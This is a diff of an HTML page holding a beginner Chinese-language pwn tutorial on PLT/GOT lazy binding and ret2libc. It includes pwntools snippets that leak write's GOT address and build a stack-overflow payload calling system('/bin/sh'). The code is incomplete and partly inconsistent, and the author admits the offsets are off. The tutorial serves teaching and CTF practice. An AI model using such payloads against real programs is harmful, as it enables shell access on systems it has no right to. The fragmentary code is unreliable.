@@ -181,7 +181,7 @@
         
     </div>
 </header>
-<header class="content-header post-header">
+<header class="content-header page-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
         <h1 class="title">Introduction to pwn 1.3--plt/got</h1>
@@ -217,26 +217,8 @@
 
 
 <div class="container body-wrap">
-    <article id="post-pwn-入门1-3-plt-got"
-  class="post-article article-type-post" itemprop="blogPost">
-    <div class="post-card">
-        <h1 class="post-card-title">Introduction to pwn 1.3--plt/got</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2018-08-28 12:12:56" datetime="2018-08-28T04:12:56.000Z"  itemprop="datePublished">2018-08-28</time>
-
-            
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
-
-
-
-            
-
-            
-
-
-            
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
+    <article class="page-article fade" itemprop="blogPage">
+        <div class="post-content page-content" id="page-content" itemprop="pageContent">
             
             <pre><code>&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; 
 </code></pre><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p>
@@ -264,47 +246,34 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure>
 <ol start="4">
+<li>构造payload泄露write函数的实际地址</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4)</span><br></pre></td></tr></table></figure>
+<ol start="4">
 <li>泄露libc中的system与/bin/sh地址</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_got = wri_got - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_got = wri_got - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure>
 <ol start="5">
-<li>构造payload <code>payload = flat([&#39;a&#39;*20 , sys_got , 0xdeadbeef , binsh_got])</code></li>
+<li>构造payload </li>
 </ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
 <p><em>因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补</em></p>
 
         </div>
-        
-<blockquote class="post-copyright">
-    <div class="content">
-        
-<span class="post-time">
-    Last updated: <time datetime="2018-09-25T13:46:03.943Z" itemprop="dateUpdated">2018-09-25 21:46:03</time>
-</span><br>
-
-
-        
-        转载注明出处，原文地址：<a href="/2018/08/28/pwn-入门1-3-plt-got/" target="_blank" rel="external">http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/</a>
-        
-    </div>
-    <footer>
-        <a href="http://siriuswhiter.tk">
-            <img src="/img/avatar.jpg" alt="Sirius Whiter">
-            Sirius Whiter
-        </a>
-    </footer>
-</blockquote>
-
         
             <div class="page-reward">
     <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
 </div>
 
-            
         
-        <div class="post-footer">
-            
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>
-
+        
+        <div class="card page-about-me flex-row">
+            <a href="/" class="avatar waves-effect waves-circle waves-light"><img src="/img/avatar.jpg"></a>
+            <div class="content flex-col">
+                <p><strong>Sirius Whiter</strong></p>
+                <p><em>pwn what you want</em></p>
+                <p></p>
+            </div>
             <div class="page-share-wrap">
     
 
@@ -341,46 +310,16 @@
 
         </div>
         
-            
-
-
         
-    </div>
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">pwn-300-Formatting string vulnerability</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="next">
-      <a href="/2018/08/28/pwn-入门n-n/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">Introduction to pwn2.2--UAF</h4>
-      </a>
-    </div>
-  
-</nav>
+        <div class="card">   
+           
 
 
+        </div>
+        
+    </article>
     
-    
-        <aside class="post-widget">
-            <nav class="post-toc-wrap" id="post-toc">
-                <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#延迟绑定"><span class="post-toc-number">1.</span> <span class="post-toc-text">延迟绑定</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#plt-与-got"><span class="post-toc-number">2.</span> <span class="post-toc-text">plt 与 got</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ret2libc的实现"><span class="post-toc-number">3.</span> <span class="post-toc-text">ret2libc的实现</span></a></li></ol>
-            </nav>
-            <div class="toc-bar"><div>
-        </aside>
-    
-</article>
-
-    <div id="reward" class="page-modal reward-lay">
+        <div id="reward" class="page-modal reward-lay">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <h3 class="reward-title">
         <i class="icon icon-quote-left"></i>
@@ -408,6 +347,7 @@
 
     
 </div>
+
 
         <footer class="footer">
     
